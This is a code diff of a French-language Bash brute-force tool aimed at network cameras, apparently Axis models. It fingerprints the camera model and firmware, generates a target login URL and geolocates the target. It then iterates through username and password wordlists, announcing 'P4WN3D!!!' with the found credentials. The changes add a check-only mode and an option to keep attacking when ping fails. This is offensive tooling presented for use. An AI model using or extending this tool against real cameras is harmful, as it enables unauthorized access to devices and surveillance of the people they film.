+	echo -e "$jaune |_[-] Curl :$vert OK!"
+else
+	curl_existe="NON"
+	echo -e "$jaune |_[-] Curl :$rouge NON!"
+	echo -e "$jaune |  |_[-] Solution :$cyan apt install curl"
+fi
+
+if [ "$ping_existe" != "OUI" ] || [ "$curl_existe" != "OUI" ] ;then
+	echo -e "$jaune |_[-] Erreur :$rouge Dependences non satisfaites"
+	echo -e "$jaune |_[-] Erreur :$rouge On quitte..."
+	exit
+fi
 ####################################################################################################################
 #                                                     LISTE PARAMETRES
 ####################################################################################################################
@@ -667,12 +718,13 @@ echo -e $espaces$texte_web
 echo -e "$jaune_fonce\n$souligne"'PARAMETRES:'$reset
 
 echo -e "$jaune[+] Cible : $cyan$ip"
-echo -e "$jaune[+] Password list:$cyan $mdp_wordlist $jaune"
-echo -e "$jaune[+] Usernames list:$cyan $users_wordlist $jaune"
-echo -e "$jaune[+] Total usernames:$cyan$nb_users"
-echo -e "$jaune[+] Total passwords:$cyan$nb_mdp"
-echo -e "$jaune[+] Nombre de combinaisons:$cyan"$nb_combinaisons
-
+if [ "$checkOnly" != "OUI" ];then
+	echo -e "$jaune[+] List des mot-de-passe:$cyan $mdp_wordlist $jaune"
+	echo -e "$jaune[+] List des usernames:$cyan $users_wordlist $jaune"
+	echo -e "$jaune[+] Total usernames:$cyan$nb_users"
+	echo -e "$jaune[+] Total mot-de-passes:$cyan$nb_mdp"
+	echo -e "$jaune[+] Nombre de combinaisons:$cyan"$nb_combinaisons
+fi
 if [ $curl_timeout -ne $curl_timeout_default ] || [ $curl_maxtime -ne $curl_maxtime_default ];then
 	echo -e "$jaune[+] TTL Requêtes HTTP: $cyan curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
 fi
@@ -683,6 +735,10 @@ fi
 
 if [ $ping_timeout -ne $ping_timeout_default ];then
 	echo -e "$jaune[+] Ping timeout:$cyan $ping_timeout"
+fi
+
+if [ "$noPing" = "OUI" ];then
+	echo -e "$jaune[+] Test de connectivité:$cyan Ignorer le résultat du ping"
 fi
 
 if [ "$checkOnly" = "OUI" ];then
@@ -702,9 +758,10 @@ if [ "$fichier_logs" != "$fichier_logs_defaut" ];then
 fi
 
 
-logMessage "Fichier usernames : $users_wordlist" "INFORMATION" 
-logMessage "Fichier mots-de-passe : $mdp_wordlist" "INFORMATION" 
-
+if [ "$checkOnly" != "OUI" ];then
+	logMessage "Fichier usernames : $users_wordlist" "INFORMATION" 
+	logMessage "Fichier mots-de-passe : $mdp_wordlist" "INFORMATION" 
+fi
 ####################################################################################################################
 #                                                 TEST DE CONNECTIVITE
 ####################################################################################################################
@@ -716,10 +773,16 @@ test_connectivite=$(checkConnectiviteCible)
 if [ "$test_connectivite" = "SUCCES" ];then
 	echo -e "$jaune |_[-] Resultat :$vert OK!"
 else
-	echo -e "$jaune |_[-] Resultat :$rouge ECHEC!"
-	echo -e "$jaune |_[-] Pas d'attaque à faire :$rouge On quitte"
 	logMessage "Ne repond pas au pings" "ERREUR!!!"
-	exit
+	echo -e "$jaune |_[-] Resultat :$rouge ECHEC!"
+	if [ "$noPing" != "OUI" ];then
+		echo -e "$jaune |_[-] Pas d'attaque à faire :$rouge On quitte"
+		exit
+	else
+		echo -e "$jaune |_[-] On attaque quand même:$rouge On ignore le résultat du ping"
+		logMessage "On ignore le résultat du ping" "ERREUR!!!"
+		
+	fi
 fi
 ####################################################################################################################
 #                                                       ANALYSE
@@ -740,11 +803,11 @@ else
 	echo -e "$jaune[+] Detection du modele de la camera en cours...$cyan"
 	logMessage "Detection du modele de la camera" "INFORMATION" 
 	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
-	echo -e "$jaune |_[-] Connexion en cours...$cyan\n"
+	echo -en "$jaune |_[-] Connexion en cours...$cyan"
 	x_modele_complet=$(fullModeleDetect $ip)
 	modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
 	modele=${modele/.*[aA][xX][iI][sS]/axis}
-
+	echo -e "$cyan terminé!\n"
 	#echo -e $magenta$x_modele_complet
 	if [ "$modele_complet" != "$modele_nondetecte" ]; then
 		no_modele_recherche=0
@@ -768,46 +831,58 @@ else
 		echo -e "$magenta Le modele n'a pas été reconnu! $jaune_fonce:/"
 	fi
 
-	echo -e "$jaune[+] Detection de la version du firmware...$cyan"
+	echo -en "$jaune[+] Detection de la version du firmware...$cyan"
 	#version=$(versionDetect $modele_complet) #pb resultats erronés
 	version=$(echo $modele_complet|rev|cut -d " " -f 1|rev)
 	if [ "$version" != "N/A" ]; then
 		version=$(echo $modele_complet|egrep -o [0-9.,].*)
 	fi
+	echo -e "$cyan terminé!"
 
 fi
 
 
-echo -e "$jaune[+] Cherche une URL à attaquer...$cyan"
+echo -en "$jaune[+] Cherche une URL à attaquer...$cyan"
 if [ "$urlforced" != "OUI" ]; then 
-	logMessage "Recherche URL à attaquer" "INFORMATION" 
 	url=$(urlModele $ip $modele)
+	if [ "$checkOnly" != "OUI" ];then
+		logMessage "Recherche URL à attaquer" "INFORMATION" 
+	fi
 fi
+echo -e "$cyan terminé!"
 
-ip4file=${ip/:/-PORT_}
-fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
-fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip4file}
-if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
-	echo -e "$jaune[+] Fichier export:$cyan $fichier_mdp_trouve $jaune"
-fi
 
 #La geolocalisation
 if [ "$skipGeo" != "OUI" ];then
-	echo -e "$jaune[+] Geolocalisation de l'IP...$cyan"
-	logMessage "Geolocalisation" "INFORMATION" 
+	echo -en "$jaune[+] Geolocalisation de la cible...$cyan"
 	infosGeo_save=$(infosGeolocalisation $ip)
 	infosGeo=$infosGeo_save
 	infosGeoExport=$infosGeo_save
+	if [ "$checkOnly" != "OUI" ];then
+		logMessage "Geolocalisation" "INFORMATION" 
+	fi
+	echo -e "$cyan terminé!"
 else
-	logMessage "Geolocalisation : désactivée" "ATTENTION" 
+	if [ "$checkOnly" != "OUI" ];then
+		logMessage "Geolocalisation" "INFORMATION" 
+	fi
 fi
+if [ "$checkOnly" != "OUI" ];then
+	#export...
+	ip4file=${ip/:/-PORT_}
+	fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
+	fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip4file}
+	if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
+		echo -e "$jaune[+] Fichier export:$cyan $fichier_mdp_trouve $jaune"
+	fi
 
-#prepas vars env et mise en forme 
-echo -e "$jaune[+] Préparation de l'environnement...$cyan"
+	#prepas vars env et mise en forme 
+	echo -en "$jaune[+] Préparation de l'environnement...$cyan"
 
-infosGeo=${infosGeo//':'/":$cyan"}
-infosGeo=${infosGeo//','/"\n$jaune |_[-]"}
-
+	infosGeo=${infosGeo//':'/":$cyan"}
+	infosGeo=${infosGeo//','/"\n$jaune |_[-]"}
+	echo -e "$cyan terminé!"
+fi
 
 ####################################################################################################################
 #                                                       INFORMATIONS
@@ -821,13 +896,24 @@ if [ ${#version} -gt 0 ]; then
 else
 	echo -en "$cyan "
 fi
+
+
+if [ "$checkOnly" = "OUI" ];then
+	logMessage "Modele: $modele" "INFORMATION" 
+	logMessage "Firmware: $version" "INFORMATION" 
+fi
+
 if [ "$modeles_verifie" = "OUI" ]; then 
 	echo -e $cyan" ("$vert"modele reconnu"$cyan")"
+	logMessage "Compatibilité: Modele verifié!" "INFORMATION" 
 else
 	echo -e $cyan" ("$rouge"modele non verifié"$cyan")"
+	logMessage "Compatibilité: Modele non testé!" "INFORMATION" 
 fi
 
 echo -e "$jaune[+] URL Cible generée:$cyan $url"
+
+
 
 if [ "$skipGeo" != "OUI" ];then
 	if [ ${#infosGeo} -eq 0 ]; then infosGeo="Pas d'informations disponibles" ;fi
@@ -851,7 +937,6 @@ if [ "$checkOnly" != "OUI" ];then
 	progression_pourcent=0
 	while read user; do 
 		while read mdp; do 
-
 			requete_temps_A=$(/bin/date +%s)
 			#avancement:
 			total_fait=$(($total_fait+1))		
@@ -930,9 +1015,11 @@ if [ "$checkOnly" != "OUI" ];then
 
 				fi
 			fi
+
 			if [ "$modeVerbose" != 'OUI' ];then
 				tput cuu1;tput el
 			fi
+
 			requete_temps_B=$(/bin/date +%s)
 			top_timer=$(( $(/bin/date +%s) -$heure_depart))
 		done < $mdp_wordlist
@@ -957,26 +1044,28 @@ duree_totale=$(/bin/date -d @$heure_duree_totale +%H:%M:%S)
 #                                    			BRAVO OU PAS ?
 ####################################################################################################################
 
-if [ "$mdp_trouve" = "OUI" ]; then
-	message_fin="Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. "
+if [ "$checkOnly" != "OUI" ] ; then
+	if [ "$mdp_trouve" = "OUI" ] ; then
+		message_fin="Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. "
 
-	#echo -e "$jaune |_[-] Succes: $cyan$message_fin"
-	tput cuu1;tput el;echo -e "$jaune[+] Attaque $ip:$vert Succes!$cyan $message_fin"
-	echo -e "$jaune |_[-] Login: $user"
-	echo -e "$jaune |_[-] Mot-de-passe: $mdp"
-	echo -e $vert
-	echo -e $banniere_bravo|base64 -d
-	echo -e $ab_slogan_bravo
-	echo -e $reset
-	logMessage "$message_fin" "P4WN3D!!!"
-else
-	message_fin="Le mot-de-passe n'a pas été trouvé apres $total_fait combinaisons, soit "$top_timer"s d'attaque!" 
-	echo -e "$jaune[+] Attaque $ip: $cyan$message_fin"
-	echo -e $rouge
-	echo -e $banniere_tryagain|base64 -d
-	echo -e $ab_slogan_defaite
-	echo -e $reset
-	logMessage "$message_fin" "DOMMAGE!!!"
+		#echo -e "$jaune |_[-] Succes: $cyan$message_fin"
+		tput cuu1;tput el;echo -e "$jaune[+] Attaque $ip:$vert Succes!$cyan $message_fin"
+		echo -e "$jaune |_[-] Login: $user"
+		echo -e "$jaune |_[-] Mot-de-passe: $mdp"
+		echo -e $vert
+		echo -e $banniere_bravo|base64 -d
+		echo -e $ab_slogan_bravo
+		echo -e $reset
+		logMessage "$message_fin" "P4WN3D!!!"
+	else
+		message_fin="Le mot-de-passe n'a pas été trouvé apres $total_fait combinaisons, soit "$top_timer"s d'attaque!" 
+		echo -e "$jaune[+] Attaque $ip: $cyan$message_fin"
+		echo -e $rouge
+		echo -e $banniere_tryagain|base64 -d
+		echo -e $ab_slogan_defaite
+		echo -e $reset
+		logMessage "$message_fin" "DOMMAGE!!!"
+	fi
 fi
 ####################################################################################################################
 #                                    SYNTHESE DES DONNEES RECUPEREES POUR l'EXPORT
